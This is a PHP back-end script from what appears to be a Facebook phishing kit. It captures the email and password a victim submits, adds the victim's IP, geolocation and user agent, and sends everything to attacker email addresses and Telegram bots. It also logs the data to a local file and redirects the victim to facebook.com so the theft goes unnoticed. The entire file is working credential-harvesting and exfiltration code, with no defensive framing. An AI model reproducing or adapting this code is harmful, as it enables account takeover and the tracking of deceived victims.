<?php

include 'helloworld.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";


$file = fopen("Fuckings.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "FUCKED BY ME$ip";
$headers = "Hello :>";
$send = $email; 
$send = $email2; 
$message = "Hello Friends\r\n";
$message .= "|Email      : ".$_POST['email']."\r\n";
$message .= "|Password      	 : ".$_POST['pass']."\r\n";
$message .= "This Fucked BY MY\r\n";
$message .= "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP:" .$_SERVER["REMOTE_ADDR"] . "\nUser agent: " . $_GET["uagent"]."/r/n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "BY ME\r\n";
$message .= "FUCKED BY ME]\n";
mail($send,$subject,$message,$headers);
mail($send2,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
file_get_contents("https://api.telegram.org/bot".$api2."/sendMessage?chat_id=".$chatid2."&text=" . urlencode($message)."" );
$myfile = fopen("Fuckings.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: https://www.facebook.com/");


?>

